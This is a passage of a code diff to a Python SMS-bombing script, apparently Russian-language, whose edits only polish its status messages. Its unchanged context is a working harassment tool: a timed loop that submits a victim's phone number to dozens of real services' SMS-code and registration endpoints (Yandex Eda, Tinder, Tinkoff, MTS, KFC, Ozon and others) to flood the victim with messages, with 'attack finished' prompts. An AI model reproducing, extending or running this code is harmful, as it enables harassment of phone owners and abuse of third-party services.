         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -2457,10 +2457,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -2468,10 +2468,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -2480,10 +2480,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -2491,10 +2491,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -2504,10 +2504,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -2515,10 +2515,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -2527,11 +2527,11 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -2540,10 +2540,10 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -2552,7 +2552,7 @@ if call == str(2):
             time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -2560,10 +2560,10 @@ if call == str(2):
             print('[+] RuTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправлено !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
@@ -2571,10 +2571,10 @@ if call == str(2):
             print('[+] BelkaCar отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправленo !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://starpizzacafe.com/mods/a.function.php',
@@ -2583,10 +2583,10 @@ if call == str(2):
             print('[+] StarPizzaCafe отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -2595,10 +2595,10 @@ if call == str(2):
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
@@ -2606,10 +2606,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -2618,10 +2618,10 @@ if call == str(2):
             print('[+] Tinkoff отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -2630,10 +2630,10 @@ if call == str(2):
             print('[+] Dostavista отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -2643,10 +2643,10 @@ if call == str(2):
             print('[+] MonoBank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -2655,10 +2655,10 @@ if call == str(2):
             print('[+] binotel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
@@ -2667,10 +2667,10 @@ if call == str(2):
             print('[+] SportMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -2679,10 +2679,10 @@ if call == str(2):
             print('[+] Alfalife отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
@@ -2690,10 +2690,10 @@ if call == str(2):
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://silpo.ua/graphql', data={
@@ -2703,10 +2703,10 @@ if call == str(2):
             print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
@@ -2714,10 +2714,10 @@ if call == str(2):
             print('[+] BTfair отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone',
@@ -2727,10 +2727,10 @@ if call == str(2):
             print('[+] GGbet отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-]  не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.etm.ru/cat/runprog.html',
@@ -2740,10 +2740,10 @@ if call == str(2):
             print('[+] ETM отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -2752,10 +2752,10 @@ if call == str(2):
             print('[+] TheLive отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
@@ -2763,10 +2763,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
@@ -2777,7 +2777,7 @@ if call == str(2):
             print('[+] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://zoloto585.ru/api/bcard/reg/',
@@ -2788,10 +2788,10 @@ if call == str(2):
             print('[+] Zoloto585 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
@@ -2799,10 +2799,10 @@ if call == str(2):
             print('[+] Kasta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Kasta Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
@@ -2811,10 +2811,10 @@ if call == str(2):
             print('[+] Тaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -2824,10 +2824,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.creditter.ru/confirm/sms/send',
@@ -2836,10 +2836,10 @@ if call == str(2):
             print('[+] Creditter отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
@@ -2852,10 +2852,10 @@ if call == str(2):
             print('[+] Ingos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://win.1admiralxxx.ru/api/en/register.json',
@@ -2865,10 +2865,10 @@ if call == str(2):
             print('[+] Admiralxxx отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
@@ -2876,10 +2876,10 @@ if call == str(2):
             print('[+] Av отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -2888,10 +2888,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
@@ -2899,10 +2899,10 @@ if call == str(2):
             print('[+] City24 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
@@ -2910,10 +2910,10 @@ if call == str(2):
             print('[+] SushiMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
@@ -2921,10 +2921,10 @@ if call == str(2):
             print('[+] MultiPlex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
@@ -2932,10 +2932,10 @@ if call == str(2):
             print('[+] 3040 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.niyama.ru/ajax/sendSMS.php',
@@ -2944,10 +2944,10 @@ if call == str(2):
             print('[+] Niyama отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Niyama не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
@@ -2955,10 +2955,10 @@ if call == str(2):
             print('[+] VSK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] VSK не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
@@ -2966,10 +2966,10 @@ if call == str(2):
             print('[+] EasyPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://fix-price.ru/ajax/register_phone_code.php',
@@ -2978,10 +2978,10 @@ if call == str(2):
             print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.nl.ua',
@@ -2992,10 +2992,10 @@ if call == str(2):
             print('[+] NovaLinia отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
@@ -3003,10 +3003,10 @@ if call == str(2):
             print('[+] Tele2 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
@@ -3014,10 +3014,10 @@ if call == str(2):
             print('[+] Finam отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://makimaki.ru/system/callback.php',
@@ -3026,10 +3026,10 @@ if call == str(2):
             print('[+] MakiMaki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.flipkart.com/api/6/user/signup/status',
@@ -3040,10 +3040,10 @@ if call == str(2):
             print('[+] FlipKart отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
@@ -3051,10 +3051,10 @@ if call == str(2):
             print('[+] Online.ua отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
@@ -3062,10 +3062,10 @@ if call == str(2):
             print('[+] PlanetaKino отправлено!')
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ontaxi.com.ua/api/v2/web/client',
@@ -3074,10 +3074,10 @@ if call == str(2):
             print('[+] OnTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -3085,10 +3085,10 @@ if call == str(2):
             print('[+] Iqos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://smart.space/api/users/request_confirmation_code/',
@@ -3097,10 +3097,10 @@ if call == str(2):
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
@@ -3108,10 +3108,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
@@ -3121,10 +3121,10 @@ if call == str(2):
             print('[+] tarantino-family отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://apteka.ru/_action/auth/getForm/',
@@ -3137,10 +3137,10 @@ if call == str(2):
             print('[+] Apteka отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://uklon.com.ua/api/v1/account/code/send',
@@ -3149,10 +3149,10 @@ if call == str(2):
             print('[+] Uklon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
@@ -3161,10 +3161,10 @@ if call == str(2):
             print('[+] Ozon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -3174,10 +3174,10 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
